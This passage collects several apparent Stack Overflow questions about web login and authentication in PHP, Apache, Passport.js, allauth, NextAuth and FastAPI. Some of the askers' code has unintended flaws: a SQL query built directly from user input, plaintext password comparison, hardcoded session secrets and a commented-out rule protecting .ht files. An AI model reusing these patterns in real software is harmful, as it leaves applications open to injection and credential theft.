  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
  &lt;title&gt;Login Page&lt;/title&gt;
  &lt;style&gt;
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f0f0f0;
    }

    .container {
      width: 300px;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    h2 {
      text-align: center;
    }

    input[type=&quot;text&quot;],
    input[type=&quot;password&quot;] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }

    input[type=&quot;submit&quot;] {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 4px;
      background-color: #007bff;
      color: #fff;
      cursor: pointer;
    }

    input[type=&quot;submit&quot;]:hover {
      background-color: #0056b3;
    }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div class=&quot;container&quot;&gt;
    &lt;h2&gt;Login&lt;/h2&gt;
    &lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt;
      &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; required&gt;
      &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot; required&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Login&quot; class=&quot;loginBtn&quot; name =&quot;login_Btn&quot;&gt;
    &lt;/form&gt;
  &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Then I have this (.php):</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;body&gt;
&lt;?php 
    $servername = &quot;localhost&quot;;
    $username = &quot;root&quot;;
    $password = &quot;&quot;;
    $database = &quot;my_db&quot;;

    /* You should enable error reporting for mysqli before attempting to make a connection */
    mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);

    $conn = mysqli_connect($servername, $username, $password, $database);

    /* Set the desired charset after establishing a connection */
    mysqli_set_charset($conn, 'utf8mb4');

    printf(&quot;Success... %s\n &lt;br&gt;&quot;, mysqli_get_host_info($conn));

    if(isset($_POST['login_Btn'])){
        $username=$_POST['username'];
        $password=$_POST['password'];
        $sql= &quot;SELECT * FROM my_db.logindetails WHERE username = '$username'&quot;;
        $result = mysqli_query($conn,$sql);
            while($row = mysqli_fetch_assoc($result)){
                $resultPassword = $row['password'];
                if($password == $resultPassword) {
                    header('Location:index.html');
                } else {
                    echo &quot;&lt;script&gt;alert('Login unsuccesful');&lt;/script&gt;&quot;;
                    }
            }
    }

?&gt;
&lt;br&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>The problem is that whenboth the username and password is wrong then I can't get a javascript alert popup that says &quot;Login unsuccesful&quot;. It only works when the username is correct and the password is wrong. Further I want to make a login page that sends e-mail with a code so that the user must prove that he has access to his e-mail account every time he wants to login.
Please help me with this project.</p>
"
"<p>I use Apache2 to intervene between my site and the User with an Authentication Login dialogue. I've added a hashed password to the Apache2 .htaccess file. The Site has a registered subdomain, and the web server has a set of SSL certs and keys. However, when a User tries to access the site and they are presented with the Username &amp; Password box, the username and password are not accepted. I would appreciate some help.</p>
<p>I create a Username and Password for the site authentication using:</p>
<pre><code>sudo htpasswd -c /etc/apache2/.htpasswd
</code></pre>
<p>I can see a hashed version of the password in that file.</p>
<p>Then, these are my Apache2 server configuration files:</p>
<p><strong>/etc/apache2/sites-available/my-site.conf</strong></p>
<pre><code>&lt;IfModule mod_ssl.c&gt;
&lt;VirtualHost *:443&gt;
    ServerName my-site.com
    ServerAlias subdomain.my-site.com
    DocumentRoot /var/www/my-site/public_html


    &lt;Directory /var/www/my-site/public_html&gt;
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    &lt;/Directory&gt;

    &lt;Location &quot;/&quot;&gt;
        AuthType Digest
        AuthName &quot;Restricted Area&quot;
        AuthDigestDomain /
        AuthDigestProvider file
        AuthUserFile /etc/apache2/.htpasswd
        Require valid-user
    &lt;/Location&gt;


SSLCertificateFile /etc/letsencrypt/live/subdomain.my-site.com/fullchain.pem
SSLCertificateKeyFile /etc/letsencrypt/live/subdomain.my-site.com/privkey.pem
Include /etc/letsencrypt/options-ssl-apache.conf
&lt;/VirtualHost&gt;
&lt;/IfModule&gt;
</code></pre>
<p>And the main apache config file <strong>/etc/apache2/apache.conf</strong></p>
<pre><code>DefaultRuntimeDir ${APACHE_RUN_DIR}
PidFile ${APACHE_PID_FILE}
Timeout 300
KeepAlive On
MaxKeepAliveRequests 100
KeepAliveTimeout 5
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}
HostnameLookups Off
ErrorLog ${APACHE_LOG_DIR}/error.log
LogLevel warn
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf
Include ports.conf
&lt;Directory /&gt;
        Options FollowSymLinks
        AllowOverride None
        Require all denied
&lt;/Directory&gt;

&lt;Directory /usr/share&gt;
        AllowOverride None
        Require all granted
&lt;/Directory&gt;

&lt;Directory /var/www/&gt;
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
&lt;/Directory&gt;

&lt;Directory /usr/share&gt;
        AllowOverride None
        Require all granted
&lt;/Directory&gt;

&lt;Directory /var/www/&gt;
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
&lt;/Directory&gt;

AccessFileName .htaccess
#&lt;FilesMatch &quot;^\.ht&quot;&gt;
#        Require all denied
#&lt;/FilesMatch&gt;

LogFormat &quot;%v:%p %h %l %u %t \&quot;%r\&quot; %&gt;s %O \&quot;%{Referer}i\&quot; \&quot;%{User-Agent}i\&quot;&quot; vhost_combined
LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %O \&quot;%{Referer}i\&quot; \&quot;%{User-Agent}i\&quot;&quot; combined
LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %O&quot; common
LogFormat &quot;%{Referer}i -&gt; %U&quot; referer
LogFormat &quot;%{User-agent}i&quot; agent

IncludeOptional conf-enabled/*.conf

IncludeOptional sites-enabled/*.conf

Include /etc/apache2/httpd.conf
</code></pre>
<p>My <strong>/etc/apache/httpd.conf</strong> file is empty, and I do not have a <strong>.htaccess</strong> file.</p>
<p>I've cleared the cache, used private browsers, and I've asked others to try, but ultimately the password and username I set don't work.</p>
<p>Please tell me if I'm missing data for you to help. I'm happy to edit the question. Thanks</p>
<p><strong>Edit</strong></p>
<p>I noticed the following:</p>
<pre><code>&lt;FilesMatch &quot;^\.ht&quot;&gt;
        Require all denied
&lt;/FilesMatch&gt;
</code></pre>
<p>I commented it out, restarted the server, and tried again in a fresh private browser. No luck.</p>
"
"<p>I'm new in passport and I would like some help. I can't log in after adding local passport to my program. The login page is loaded and is always redirected to itself, and is not taken to the main page even if the login is correct. The registration form is working normally.</p>
<p><strong>This is my node code</strong>:</p>
<pre><code>import express from &quot;express&quot;;
import bodyParser from &quot;body-parser&quot;;
import pg from &quot;pg&quot;;
import bcrypt from &quot;bcrypt&quot;;
import session from &quot;express-session&quot;;
import passport from &quot;passport&quot;;
import { Strategy } from &quot;passport-local&quot;;

const port = 3000;
const app = express();
const saltRounds = 10;

app.use(session({
    secret: &quot;TOPSECRET&quot;,
    resave: false,
    saveUninitialized: true,
}));

app.use(bodyParser.urlencoded({extended: true}));
app.use(express.static(&quot;public&quot;));

app.use(passport.initialize());
app.use(passport.session());

const db = new pg.Client({
    user: &quot;postgres&quot;,
    host: &quot;localhost&quot;,
    database: &quot;connectwave&quot;,
    password: &quot;secret&quot;,
    port: 5432,
})

db.connect();

let currentId;

app.get(&quot;/login&quot;, (req, res) =&gt; {
    res.render(&quot;login.ejs&quot;);
})

app.get(&quot;/register&quot;, (req, res) =&gt; {
    res.render(&quot;register.ejs&quot;);
})

app.get(&quot;/home&quot;, async (req, res) =&gt; {
    console.log(req.user);
    if (req.isAuthenticated()) {
        const result = await db.query(&quot;SELECT * FROM posts ORDER BY id desc&quot;);
        const data = result.rows;
        res.render(&quot;index.ejs&quot;, {
            data: data,
        });  
    } else {
        res.redirect(&quot;/login&quot;);
    }
    
})

app.post(&quot;/login&quot;, passport.authenticate('local', {
    successRedirect: &quot;/home&quot;,
    failureRedirect: &quot;/login&quot;,
}));

app.post(&quot;/register&quot;, async (req, res) =&gt; {
    const email = req.body.emailRegister;
    const password = req.body.passwordRegister;

    try {
        const checkEmail = await db.query(&quot;SELECT * FROM users WHERE email = $1&quot;, [email]);
        if (checkEmail.rows.length &gt; 0) {
            res.render(&quot;register.ejs&quot;, {
                emailMessage: &quot;Email has already been taken.&quot;,
            });
        } else {
            bcrypt.hash(password, saltRounds, async (err, hash) =&gt; {
                if (err) {
                    console.log(&quot;Error hashing password&quot;, err);
                } else {
                    const result = await db.query(&quot;INSERT INTO users (email, password) VALUES ($1, $2) RETURNING *&quot;, [email, hash]);
                    const user = result.rows[0];
                    currentId = result.rows[0].id;
                    req.login(user, (err) =&gt; {
                        if (err) {
                            console.log(err);
                        } else {
                            res.redirect(&quot;/home&quot;);
                        }
                    })
                }
            });
        }

    } catch (err) {
        console.log(err);
    }
});

app.post(&quot;/post&quot;, async (req, res) =&gt; {
    const post = req.body.createpost;
    currentId = currentId;
    try {
      await db.query(&quot;INSERT INTO posts (text, user_id) VALUES ($1, $2)&quot;, [post, currentId])  
      res.redirect(&quot;/home&quot;); 
    } catch (err) {
        console.log(err);
    }
    
})

app.post(&quot;/text&quot;, async (req, res) =&gt; {
    const text = req.body.text_post;
    const id = req.body.checkBtn;
    try {
        await db.query(&quot;UPDATE posts SET text = $1 WHERE id = $2&quot;, [text, id]);
        res.redirect(&quot;/home&quot;);
    } catch (err) {
        console.log(err);
    }
})

app.post(&quot;/delete&quot;, async (req, res) =&gt; {  
    const id = req.body.post_id;
    try {
        await db.query(&quot;DELETE FROM posts WHERE id = $1&quot;,[id]);
        res.redirect(&quot;/home&quot;); 
    } catch (err) {
        console.log(err);
    }
    
})

passport.use(new Strategy(async function verify(usarname, password, cb) {
    try {
        const result = await db.query(&quot;SELECT * FROM users WHERE email = $1&quot;, [usarname]);
    
        if (result.rows.length &gt; 0) {

            const user = result.rows[0];
            const hashPassword = user.password;

            bcrypt.compare(password, hashPassword, (err, valid) =&gt; {
                if (err) {
                    console.log(&quot;Error comparing password&quot;, err);
                    return cb(err);
                } else {
                    if (valid) {
                        currentId = user.id;
                        return cb(null, user);
                    } else {
                        return cb(null, false);
                    }
                }
            });

        } else {
            return cb(&quot;User not found&quot;);
        }
    } catch (err) {
        console.log(err);
    }
}));

passport.serializeUser((user, cb) =&gt; {
    cb(null, user);
});

passport.deserializeUser((user, cb) =&gt; {
    cb(null, user);
})

app.listen(port, () =&gt; {
    console.log(`Server is running on port ${port}`);
});
</code></pre>
<p><strong>And this is my login.ejs page</strong> :</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;Connect Wave&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;/styles/login.css&quot;&gt;
    &lt;link rel=&quot;shortcut icon&quot; href=&quot;/images/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;
    &lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.googleapis.com&quot;&gt;
    &lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot; crossorigin&gt;
    &lt;link href=&quot;https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/remixicon@4.1.0/fonts/remixicon.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class=&quot;container-login&quot;&gt;
        &lt;div class=&quot;form-login&quot;&gt;
            &lt;h1 class=&quot;login-title&quot;&gt;Sign in to CW&lt;/h1&gt;
            &lt;form action=&quot;/login&quot; method=&quot;POST&quot;&gt;
                &lt;div class=&quot;input-required&quot;&gt;
                    &lt;input class=&quot;email&quot; type=&quot;email&quot; name=&quot;usarname&quot; placeholder=&quot;Email&quot; required&gt;
                    &lt;div class=&quot;password-box&quot;&gt;
                        &lt;input class=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot; autocomplete=&quot;off&quot; required&gt;
                        &lt;i class=&quot;ri-eye-off-line login__eye&quot; id=&quot;input-icon&quot;&gt;&lt;/i&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
                &lt;input type=&quot;submit&quot; value=&quot;Log in&quot; class=&quot;login-btn&quot;&gt;
            &lt;/form&gt;
            
            &lt;button class=&quot;forgot&quot;&gt;Forgot password?&lt;/button&gt;
            &lt;div&gt;
                    &lt;p class=&quot;signup&quot;&gt;Don't have an account? &lt;span class=&quot;signup-colored&quot;&gt;&lt;a href=&quot;/register&quot;&gt;Sign up&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; 
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    &lt;% if (locals.notPasswordMessage) {%&gt;
        &lt;div class=&quot;notPasswordMessage&quot;&gt;
            &lt;p&gt;&lt;%=notPasswordMessage %&gt;&lt;/p&gt;
        &lt;/div&gt;
    &lt;% } else if (locals.notEmailMessage) {%&gt;
        &lt;div class=&quot;notEmailMessage&quot;&gt;
            &lt;p&gt;&lt;%=notEmailMessage %&gt;&lt;/p&gt;
        &lt;/div&gt;
    &lt;% } %&gt;
    

    &lt;script&gt;
        const emailMessage = document.querySelector(&quot;.notEmailMessage&quot;)
        const passwordMessage = document.querySelector(&quot;.notPasswordMessage&quot;)
        const showHiddenPassword = (inputPass, inputIcon) =&gt; {
            const input = document.querySelector(inputPass);
            const iconEye = document.getElementById(inputIcon);

            iconEye.addEventListener(&quot;click&quot;, () =&gt; {
                if (input.type === &quot;password&quot;) {
                    input.type = &quot;text&quot;;

                    iconEye.classList.remove(&quot;ri-eye-off-line&quot;);

                    iconEye.classList.add(&quot;ri-eye-line&quot;);
                } else {
                    input.type = &quot;password&quot;;

                    iconEye.classList.remove(&quot;ri-eye-line&quot;);

                    iconEye.classList.add(&quot;ri-eye-off-line&quot;);
                }
            });

        }

        showHiddenPassword(&quot;.password&quot;, &quot;input-icon&quot;);

        setTimeout(function () {
            emailMessage.classList.add(&quot;hidden&quot;);
        }, 4000);

        setTimeout(function () {
            passwordMessage.classList.add(&quot;hidden&quot;);
        }, 4000);
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
"
"<p>I've got an instance of an application where I'm trying to authenticate users using Google/Github. All the configuration is as documented, the callbacks are as required by the docs, the client ID and secrets are alright.</p>
<p>Yet, when receiving the callback, I get shown the following page</p>
<p>The callback url i am getting is (with no error msg):</p>
<p>http://localhost:8000/accounts/github/login/callback/?code=1216195be45faf4d04af&amp;state=jYUTOFAXVKeiqzpk</p>
<p>I do not know what code and state in uri is referring to.</p>
<p><a href=""https://i.stack.imgur.com/72Ogr.png"" rel=""nofollow noreferrer"">The page I am getting redirected to after login attempt</a></p>
<p>I was using version <code>0.61.1</code></p>
<p>Downgrading to <code>0.54.0</code> and removing <code>allauth.account.middleware.AccountMiddleware</code> middleware solved the problem. But now I can not use LinkedIn Open ID Connect authentication as it is not supported in version <code>0.54.0</code>.</p>
<p>Looking for the solution so that i can use <strong>google,github, and linkedin</strong> social auth in version <code>0.61.1</code></p>
"
"<p>I can not save files in EC2 while editing on Vs-Code.</p>
<p>I am connecting to my EC2 using Vs-code.
The host username is ubuntu in my Vs-Code configuration file.
For example, if I am editing a file and then save it with Ctrl+S, I will get an error that says:</p>
<p><em>&quot;Failed to save 'test.txt': Unable to write file 'vscode-remote://ssh-remote+my-server/home/ubuntu/test.txt' (NoPermissions (FileSystemError): Error: EACCES: permission denied, open '/home/ubuntu/test.txt')&quot;.</em></p>
<p>If I type &quot;chown -R ubuntu /home/ubuntu&quot; as root, it will save whatever I want, but it is really annoying to type this command on every connection.</p>
<p>I have no problem downloading files or copying them somewhere. The only problem is during editing in the Vs-Code window.</p>
"
"<p>These were my files and i used nextjs, prisma supabase, server actions i tried to auth bby watching this video <a href=""https://www.youtube.com/watch?v=1MTyCvS05V4&amp;t=6741s&amp;ab_channel=CodeWithAntonio"" rel=""nofollow noreferrer"">https://www.youtube.com/watch?v=1MTyCvS05V4&amp;t=6741s&amp;ab_channel=CodeWithAntonio</a>. i tried console the the code it shows the error ikm which crypto error please help me solve this problem or any other solution server</p>
<p>auth.config.ts</p>
<pre><code>import type { NextAuthConfig } from &quot;next-auth&quot;
import { getUserByEmail } from &quot;./data/user&quot;;
import { LoginSchema } from &quot;./schemas&quot;;
import bcrypt from &quot;bcryptjs&quot;;
import Credentials from &quot;next-auth/providers/credentials&quot;;

export default {
  providers: [ 
    Credentials({
      async authorize(credentials) {
        const validatedFields = LoginSchema.safeParse(credentials);

        if (validatedFields.success) {
          const { email, password } = validatedFields.data;
          
          const user = await getUserByEmail(email);
          if (!user || !user.password) return null;

          const passwordsMatch = await bcrypt.compare(
            password,
            user.password,
          );
          if (passwordsMatch) return user;
        }
        return null;
      }
    })
  ],
} satisfies NextAuthConfig
</code></pre>
<p>auth.ts</p>
<pre><code>import NextAuth from &quot;next-auth&quot;
import authConfig from &quot;./auth.config&quot;;
import { PrismaAdapter } from &quot;@auth/prisma-adapter&quot;
import { db } from &quot;./lib/db&quot;;
import { getUserById } from &quot;./data/user&quot;;
import { UserRole } from &quot;@prisma/client&quot;;

export const {
  handlers: { GET, POST },
  auth,
  signIn,
  signOut,
} = NextAuth({
  callbacks: {
    async session({ token, session }) {
      if (token.sub &amp;&amp; session.user) {
        session.user.id = token.sub;
      }

      if (token.role &amp;&amp; session.user) {
        session.user.role = token.role as UserRole;
      }
      return session
    },

    async jwt({ token }) {
      if (!token.sub) return token;

      const existingUser = await getUserById(token.sub);

      if (!existingUser) return token;

      return token
  },
},
  adapter: PrismaAdapter(db),
  session: { strategy: &quot;jwt&quot;},
  ...authConfig,
});
</code></pre>
<p>Login form</p>
<pre><code>&quot;use client&quot;

import React, { useState, useTransition } from 'react'
import { CardWrapper } from './card-wrapper'
import * as z from &quot;zod&quot;;
import { useForm } from &quot;react-hook-form&quot;;
import { zodResolver } from &quot;@hookform/resolvers/zod&quot;;
import { LoginSchema } from &quot;@/schemas&quot;
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '../ui/form';
import { Input } from '../ui/input';
import { Button } from '../ui/button';
import { FormError } from '../form-error';
import { FormSuccess } from '../form-success';
import { login } from '@/action/login';

const LoginForm = () =&gt; {
  const [error, setError] = useState&lt;string | undefined&gt;(&quot;&quot;)
  const [success, setSuccess] = useState&lt;string | undefined&gt;(&quot;&quot;)
  const [isPending, startTransition] = useTransition();

  const form = useForm&lt;z.infer&lt;typeof LoginSchema&gt;&gt;({
    resolver: zodResolver(LoginSchema),
    defaultValues: {
      email: &quot;&quot;,
      password: &quot;&quot;
    },
  })

  const onSubmit = (values: z.infer&lt;typeof LoginSchema&gt;) =&gt; {
    setError(&quot;&quot;)
    setSuccess(&quot;&quot;)

    startTransition(() =&gt; {
      login(values)
        .then((data) =&gt; {
          setError(data.error);  // &quot;data is possible 'undefined'&quot;
          setSuccess(data.success); // &quot;data is possible 'undefined'&quot;

        })
    })
    
  }

  console.log(onSubmit)


  return (
    &lt;CardWrapper
     headerLabel=&quot;welcome back&quot;
     backButtonLabel=&quot;Don't have an account?&quot;
     backButtonHref=&quot;/auth/register&quot;
     showSocial
    &gt;
        &lt;Form {...form}&gt;
           &lt;form 
              onSubmit={form.handleSubmit(onSubmit)}
              className=&quot;space-y-6&quot;
              &gt;
                &lt;div className=&quot;space-y-4&quot;&gt;
                  &lt;FormField 
                    control={form.control}
                    name=&quot;email&quot;
                    render={({ field }) =&gt; (
                      &lt;FormItem&gt;
                            &lt;FormLabel className=&quot;text-lg px-1&quot;&gt;Email&lt;/FormLabel&gt;
                            &lt;FormControl&gt;
                              &lt;Input 
                                {...field}
                                disabled={isPending}
                                placeholder=&quot;example@example.com&quot;
                                type=&quot;email&quot;
                                className=&quot;text-lg&quot;
                              /&gt;
                            &lt;/FormControl&gt;
                            &lt;FormMessage /&gt;
                          &lt;/FormItem&gt;
                    )}
                  /&gt;
                  &lt;FormField 
                    control={form.control}
                    name=&quot;password&quot;
                    render={({ field }) =&gt; (
                      &lt;FormItem&gt;
                            &lt;FormLabel className=&quot;text-lg px-1&quot;&gt;Password&lt;/FormLabel&gt;
                            &lt;FormControl&gt;
                              &lt;Input 
                                {...field}
                                disabled={isPending}
                                placeholder=&quot;Pass@123&quot;
                                type=&quot;password&quot;
                              /&gt;
                            &lt;/FormControl&gt;
                            &lt;FormMessage /&gt;
                          &lt;/FormItem&gt;
                    )}
                  /&gt;
                &lt;/div&gt;
                &lt;FormError message={error} /&gt;
                &lt;FormSuccess message={success} /&gt;
                &lt;Button
                disabled={isPending}
                 type=&quot;submit&quot;
                 className=&quot;w-full text-xl&quot;
                &gt;
                  Login
                &lt;/Button&gt;
           &lt;/form&gt;
        &lt;/Form&gt;
    &lt;/CardWrapper&gt;
  )
}

export default LoginForm
</code></pre>
<p>terminal log</p>
<pre><code>[auth][error] CallbackRouteError: Read more at https://errors.authjs.dev#callbackrouteerror
[auth][cause]: TypeError: &quot;ikm&quot;&quot; must be an instance of Uint8Array or a string
    at normalizeUint8Array (webpack-internal:///(action-browser)/./node_modules/@panva/hkdf/dist/node/esm/index.js:21:47)
    at normalizeIkm (webpack-internal:///(action-browser)/./node_modules/@panva/hkdf/dist/node/esm/index.js:25:17)
    at hkdf (webpack-internal:///(action-browser)/./node_modules/@panva/hkdf/dist/node/esm/index.js:47:98)
    at getDerivedEncryptionKey (webpack-internal:///(action-browser)/./node_modules/@auth/core/jwt.js:144:67)
    at Object.encode (webpack-internal:///(action-browser)/./node_modules/@auth/core/jwt.js:62:36)
    at Module.callback (webpack-internal:///(action-browser)/./node_modules/@auth/core/lib/actions/callback/index.js:300:44)
    at async AuthInternal (webpack-internal:///(action-browser)/./node_modules/@auth/core/lib/index.js:67:24)
    at async Auth (webpack-internal:///(action-browser)/./node_modules/@auth/core/index.js:126:29)
    at async signIn (webpack-internal:///(action-browser)/./node_modules/next-auth/lib/actions.js:57:17)
    at async login (webpack-internal:///(action-browser)/./src/action/login.ts:28:9)
    at async E:\writeup-main\node_modules\next\dist\compiled\next-server\app-page.runtime.dev.js:39:406
    at async t0 (E:\writeup-main\node_modules\next\dist\compiled\next-server\app-page.runtime.dev.js:38:5773)
    at async rh (E:\writeup-main\node_modules\next\dist\compiled\next-server\app-page.runtime.dev.js:39:23636)
    at async doRender (E:\writeup-main\node_modules\next\dist\server\base-server.js:1391:30)
    at async cacheEntry.responseCache.get.routeKind (E:\writeup-main\node_modules\next\dist\server\base-server.js:1552:28)
    at async DevServer.renderToResponseWithComponentsImpl (E:\writeup-main\node_modules\next\dist\server\base-server.js:1460:28)
    at async DevServer.renderPageComponent (E:\writeup-main\node_modules\next\dist\server\base-server.js:1843:24)
    at async DevServer.renderToResponseImpl (E:\writeup-main\node_modules\next\dist\server\base-server.js:1881:32)
    at async DevServer.pipeImpl (E:\writeup-main\node_modules\next\dist\server\base-server.js:909:25)
    at async NextNodeServer.handleCatchallRenderRequest (E:\writeup-main\node_modules\next\dist\server\next-server.js:266:17)
    at async DevServer.handleRequestImpl (E:\writeup-main\node_modules\next\dist\server\base-server.js:805:17)
[auth][details]: {
  &quot;provider&quot;: &quot;credentials&quot;
}
</code></pre>
<p>i console.log in user i could get user with email and password but it in password match with bcrypt how could i solve this problem i tried using both bcrypt and bcryptjs but it show this error in bcryptjs in this code and other type of error in bcrypt</p>
"
"<p>I have created one simple application with React and Express where authentication is required and it is based on JWTs, every time user logs is, server sends him a new access token (by the way, in this jwt access token payload I store only user ID, which is number generated by MySQL when user was first registered, I don't know, maybe I have to handle it any other way?) so I also want my application to support google authentication, but I do not know how can I do that, if my server verify users credentials by this jwt access token which contains user id from database. As far as I know, when user logs in via google account, a new secret id is generated for this user, which is string, so how can I handle both my custom authentication and google authentication in one app?  How am I supposed to store those users in database? And what about firebase? I have read some information about client side authentication using firebase, but how does it work? How does server deal with such kind of authentication? I'll appreciate any help!</p>
"
"<p>I have two endpoints, /login and /index. The /login is for authentication and getting an access_token. The /index is protected and user should login first.</p>
<p>After authentication, the /login sends the access token to the client. The client should be redirect to the /index page after receiving an access token.</p>
<p>It is the code:</p>
<pre><code>oauth2_scheme = OAuth2PasswordBearer(tokenUrl=&quot;login&quot;)

@app.get(&quot;/index&quot;)
async def root(
       request: Request,
       current_user: Annotated[User, Depends(oauth2_scheme)]
):
   return templates.TemplateResponse(&quot;index.html&quot;, {&quot;request&quot;: request})

@app.post(&quot;/login&quot;)
async def login(
   request: Request,
   data: Annotated[OAuth2PasswordRequestForm, Depends()],
):
   user = authenticate_user(data.username, data.password)
   if not user:
       raise HTTPException(...)
   access_token = create_access_token(...)
   response.set_cookie(key=&quot;access_token&quot;, value=access_token, httponly=True)
   return Token(access_token=access_token, token_type=&quot;bearer&quot;)
</code></pre>
<p>It is the client form:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
   &lt;meta charset=&quot;UTF-8&quot;&gt;
   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
   &lt;title&gt;Login&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Login&lt;/h1&gt;
&lt;form id=&quot;loginForm&quot; &gt;
   &lt;table&gt;
       &lt;tr&gt;
           &lt;td&gt;
               &lt;label for=&quot;username&quot;&gt;Email:&lt;/label&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
           &lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
           &lt;td&gt;
               &lt;label for=&quot;password&quot;&gt;Pass Code:&lt;/label&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;input type=&quot;text&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
           &lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
           &lt;td&gt;&lt;/td&gt;
           &lt;td&gt;
               &lt;button type=&quot;submit&quot; style=&quot;margin-top: 15px&quot;&gt;Submit&lt;/button&gt;
           &lt;/td&gt;
       &lt;/tr&gt;
   &lt;/table&gt;
&lt;/form&gt;
&lt;script&gt;
   document.getElementById(&quot;loginForm&quot;).addEventListener(&quot;submit&quot;, function (event) {
       event.preventDefault();
       fetch(&quot;/login&quot;, {
           method: &quot;POST&quot;,
           body: new FormData(event.target)
       })
           .then(response =&gt; {
               if (response.ok) {
                   return response.json();
               } else {
                   throw new Error('Failed to authenticate');
               }
           })
           .then(data =&gt; {
               window.location.href = '/index';
           })
           .catch(error =&gt; console.error(&quot;Error:&quot;, error));
   });
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>This code does not work because of lacking of the authentication header. I get this error:
{&quot;detail&quot;:&quot;Not authenticated&quot;}</p>
<p>The test in /docs works because it sends the access token in the Authorization header. This command works:</p>
<pre><code>curl -X 'GET' \
  'http://127.0.0.1:8000/index' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer A_VALID_TOKEN '
</code></pre>
<p>I do not know how I should handle the client side. I am not sure if I should send another fetch for the /index and get the html content and assign it to the body section. I do not know what is the best practice. Maybe I can use RedirectResponse from fastapi.response. I am not sure if it is a good practice or not. /login should send back an access token and not a html code I think.</p>
<p><strong>Edit</strong>
The access token is stored in cookie.</p>
<p><strong>Edit 2</strong>
I added a hidden form and used a post method to reach the index endpoint</p>
<pre><code>&lt;form action=&quot;/index&quot; id=&quot;token_form&quot; method=&quot;post&quot; style=&quot;display: none;&quot;&gt;
    &lt;label&gt;
        &lt;input type=&quot;text&quot; id='token' name=&quot;token&quot; value=&quot;YOUR TOKEN&quot; hidden&gt;
    &lt;/label&gt;
&lt;/form&gt;
</code></pre>
<p>In the back-end I did not use Depence feature for now like</p>
<pre><code>@app.post(&quot;/index&quot;)
async def root(
        request: Request,
):
    frm = await request.form()
    return templates.TemplateResponse(&quot;index.html&quot;, {&quot;request&quot;: request})
</code></pre>
<p>But ideally I am looking for a way to use the endpoint protection through dependency injection.</p>
<pre><code>@app.post(&quot;/index&quot;)
async def root(
        current_user: Annotated[User, Depends(oauth2_scheme)]
):
</code></pre>
"
"<p>I have a login page where i have to insert user and password but if i click the login button once,it redirected me back to login page. AND THE WEIRDEST part is, if i click the login button again (after i clicked once) it goes to main page without entering any user and password. Can you help me find the problem :(, This is my code :</p>
<p><strong>LOGIN.PHP</strong></p>
<pre><code>&lt;?php 

session_start();

require_once('./config/konek.php');

if (!isset($_SESSION['log'])){
} else {
    header(&quot;location: index.php&quot;);
    exit();
}

if(isset($_POST['login'])) {
    $username = mysqli_real_escape_string($konek, $_POST['username']);
    $password = mysqli_real_escape_string($konek, $_POST['password']);

    // Query login
    $sql_login = &quot;SELECT * FROM users WHERE uname= '$username' &quot;;
    $res_login = mysqli_query($konek,$sql_login);
    $data_login = mysqli_fetch_array($res_login);

    // Validasi kredensial
    if($data_login){
        if($password === $data_login['upass']) {
            $_SESSION['uid'] = $data_login['id'];
            $_SESSION['uname'] = $data_login['uname'];
